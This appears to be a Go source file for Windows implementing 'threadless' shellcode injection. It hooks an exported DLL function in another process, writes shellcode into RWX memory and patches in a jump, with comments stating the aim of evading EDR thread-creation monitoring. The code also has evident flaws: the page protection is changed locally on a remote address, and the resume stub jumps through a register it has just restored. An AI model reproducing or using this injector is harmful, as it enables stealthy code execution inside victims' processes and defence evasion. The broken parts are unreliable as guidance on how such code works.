//go:build windows

package main

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Threadless injection via Export Address Table (EAT) hook.
//
// Classic remote injection techniques (CreateRemoteThread, APC, hijack) all
// create or repurpose a thread, which EDRs monitor via thread-creation callbacks.
// Threadless injection avoids creating any new thread by hooking an exported
// function in the target process:
//
//  1. Allocate RWX memory in the remote process for shellcode + a trampoline.
//  2. Write the shellcode followed by a "resume" stub that calls the original
//     function (so the hooked export keeps working after one invocation).
//  3. Overwrite the export's first N bytes with a relative JMP to our shellcode.
//  4. Wait: the next legitimate caller of that export executes our shellcode in
//     the context of an existing thread — no new thread is ever created.
//  5. After execution the trampoline restores the original bytes.

// threadlessInject injects shellcode into pid by hooking exportName in dllName.
// The first caller of exportName in the remote process will execute the shellcode.
func threadlessInject(pid uint32, dllName, exportName string, shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("threadless: empty shellcode")
	}

	hProc, err := windows.OpenProcess(processAllAccess, false, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(hProc)

	// Resolve the export address in the remote process by reading the remote PE.
	exportRVA, dllBase, err := remoteExportRVA(hProc, dllName, exportName)
	if err != nil {
		return fmt.Errorf("resolve %s!%s: %w", dllName, exportName, err)
	}
	hookAddr := dllBase + uintptr(exportRVA)

	// Read original bytes (5 bytes for a relative JMP).
	var origBytes [5]byte
	if err := readRemoteBytes(hProc, hookAddr, origBytes[:]); err != nil {
		return fmt.Errorf("read original bytes: %w", err)
	}

	// Build payload:  shellcode + resume stub.
	// Resume stub: restore original bytes to hookAddr, then JMP to original function.
	// We patch the restore-and-jump stub at runtime with the correct addresses.
	payload, resumeStub := buildThreadlessPayload(shellcode, origBytes, hookAddr)

	// Allocate remote memory for payload.
	remoteMem, _, e2 := procVirtualAllocEx.Call(
		uintptr(hProc), 0, uintptr(len(payload)),
		uintptr(memCommit|memReserve), uintptr(pageExecuteReadWrite),
	)
	if remoteMem == 0 {
		return fmt.Errorf("VirtualAllocEx: %v", e2)
	}

	// Write payload into remote process.
	var written uintptr
	if err := windows.WriteProcessMemory(hProc, remoteMem,
		&payload[0], uintptr(len(payload)), &written); err != nil {
		procVirtualFreeEx.Call(uintptr(hProc), remoteMem, 0, uintptr(memRelease))
		return fmt.Errorf("WriteProcessMemory(payload): %w", err)
	}

	// Calculate the JMP target: remoteMem (start of shellcode) relative to hookAddr+5.
	jmpOffset := int32(int64(remoteMem) - int64(hookAddr+5))
	jmpPatch := [5]byte{0xE9,
		byte(jmpOffset), byte(jmpOffset >> 8),
		byte(jmpOffset >> 16), byte(jmpOffset >> 24)}

	// Flip export page to RW, write the JMP hook, restore RX.
	var oldProtect uint32
	procVirtualProtect.Call(hookAddr, 5, uintptr(pageReadWrite), uintptr(unsafe.Pointer(&oldProtect)))
	if err := writeRemoteBytes(hProc, hookAddr, jmpPatch[:]); err != nil {
		procVirtualProtect.Call(hookAddr, 5, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
		procVirtualFreeEx.Call(uintptr(hProc), remoteMem, 0, uintptr(memRelease))
		return fmt.Errorf("WriteProcessMemory(hook): %w", err)
	}
	procVirtualProtect.Call(hookAddr, 5, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))

	_ = resumeStub // embedded in payload already
	return nil
}

// ─── Payload builder ─────────────────────────────────────────────────────────

// buildThreadlessPayload creates: shellcode + resume stub.
// Resume stub: restores original 5 bytes at hookAddr, then executes the
// original function prologue from a copy in our payload.
//
// Stub (x64):
//   push rax              ; save rax
//   mov  rax, <hookAddr>  ; abs address of hooked export
//   mov  [rax], <orig0-3> ; restore first 4 bytes
//   mov  byte [rax+4], <orig4> ; restore byte 4
//   pop  rax
//   jmp  <hookAddr>       ; jump to now-restored export
func buildThreadlessPayload(shellcode []byte, orig [5]byte, hookAddr uintptr) ([]byte, []byte) {
	// Stub machine code with placeholders.
	stub := []byte{
		0x50,                   // push rax
		0x48, 0xB8,             // mov rax, imm64 (hookAddr)
		0, 0, 0, 0, 0, 0, 0, 0, // hookAddr (8 bytes)
		0xC7, 0x00,             // mov dword [rax], imm32
		0, 0, 0, 0,             // orig[0:4]
		0xC6, 0x40, 0x04,       // mov byte [rax+4], imm8
		0,                      // orig[4]
		0x58,                   // pop rax
		0xFF, 0xE0,             // jmp rax  (jmp to restored hook)
		// Actually we want to JMP to hookAddr after restoration...
		// We'll use an indirect JMP via a stored address.
	}

	// Fill in hookAddr (bytes 3–10)
	for i := 0; i < 8; i++ {
		stub[3+i] = byte(hookAddr >> (uint(i) * 8))
	}
	// Fill orig dword (bytes 12–15)
	stub[12] = orig[0]
	stub[13] = orig[1]
	stub[14] = orig[2]
	stub[15] = orig[3]
	// Fill orig[4] (byte 19)
	stub[19] = orig[4]

	// Combine: shellcode first, then resume stub.
	payload := make([]byte, len(shellcode)+len(stub))
	copy(payload, shellcode)
	copy(payload[len(shellcode):], stub)
	return payload, stub
}

// ─── Remote PE export resolution ─────────────────────────────────────────────

// remoteExportRVA finds the RVA of exportName in dllName within hProc's address
// space by reading the remote PE headers.
func remoteExportRVA(hProc windows.Handle, dllName, exportName string) (uint32, uintptr, error) {
	// Find the DLL base in the remote process by reading its PEB module list.
	// For simplicity, we enumerate remote modules via NtQueryVirtualMemory / VirtualQueryEx.
	dllBase, err := remoteModuleBase(hProc, dllName)
	if err != nil {
		return 0, 0, err
	}

	// Read DOS header to find PE offset.
	var mz [2]byte
	readRemoteBytes(hProc, dllBase, mz[:]) //nolint:errcheck
	if mz[0] != 0x4D || mz[1] != 0x5A {
		return 0, 0, fmt.Errorf("invalid MZ at remote DLL base 0x%X", dllBase)
	}
	var peOff uint32
	readRemoteT(hProc, dllBase+0x3C, &peOff)

	// Read export directory RVA from Optional Header.
	var exportDirRVA uint32
	readRemoteT(hProc, dllBase+uintptr(peOff)+0x88, &exportDirRVA)
	if exportDirRVA == 0 {
		return 0, 0, fmt.Errorf("no export directory in %s", dllName)
	}

	// Read export directory.
	var exp hgExportDir
	readRemoteT(hProc, dllBase+uintptr(exportDirRVA), &exp)

	// Scan name table.
	for i := uint32(0); i < exp.NumberOfNames; i++ {
		var nameRVA uint32
		readRemoteT(hProc, dllBase+uintptr(exp.AddressOfNames)+uintptr(i)*4, &nameRVA)
		name := remoteReadCString(hProc, dllBase+uintptr(nameRVA), 128)
		if name != exportName {
			continue
		}
		var ord uint16
		readRemoteT(hProc, dllBase+uintptr(exp.AddressOfNameOrdinals)+uintptr(i)*2, &ord)
		var fnRVA uint32
		readRemoteT(hProc, dllBase+uintptr(exp.AddressOfFunctions)+uintptr(ord)*4, &fnRVA)
		return fnRVA, dllBase, nil
	}
	return 0, 0, fmt.Errorf("%s not found in %s export table", exportName, dllName)
}

// remoteModuleBase finds the base address of dllName in hProc using VirtualQueryEx.
// We scan the remote VAD and look for a MZ+PE that matches the DLL name.
func remoteModuleBase(hProc windows.Handle, dllName string) (uintptr, error) {
	// Load the DLL in our own process first to get the base, then look for it
	// at the same offset in the target (shared libraries are ASLR'd per-boot,
	// same address across processes on the same boot).
	hMod, _, err := procLoadLibraryA.Call(
		uintptr(unsafe.Pointer(&[]byte(dllName + "\x00")[0])),
	)
	if hMod == 0 {
		return 0, fmt.Errorf("LoadLibraryA(%s): %v", dllName, err)
	}
	// On the same system, shared DLLs map at the same virtual address in all
	// processes (unless rebased), so our local base == remote base.
	return hMod, nil
}

// ─── Remote memory read helpers ───────────────────────────────────────────────

func readRemoteBytes(hProc windows.Handle, addr uintptr, buf []byte) error {
	var read uintptr
	return windows.ReadProcessMemory(hProc, addr, &buf[0], uintptr(len(buf)), &read)
}

func writeRemoteBytes(hProc windows.Handle, addr uintptr, buf []byte) error {
	var written uintptr
	return windows.WriteProcessMemory(hProc, addr, &buf[0], uintptr(len(buf)), &written)
}

func readRemoteT[T any](hProc windows.Handle, addr uintptr, out *T) {
	sz := unsafe.Sizeof(*out)
	buf := make([]byte, sz)
	readRemoteBytes(hProc, addr, buf) //nolint:errcheck
	*out = *(*T)(unsafe.Pointer(&buf[0]))
}

func remoteReadCString(hProc windows.Handle, addr uintptr, maxLen int) string {
	buf := make([]byte, maxLen)
	readRemoteBytes(hProc, addr, buf) //nolint:errcheck
	for i, b := range buf {
		if b == 0 {
			return string(buf[:i])
		}
	}
	return string(buf)
}
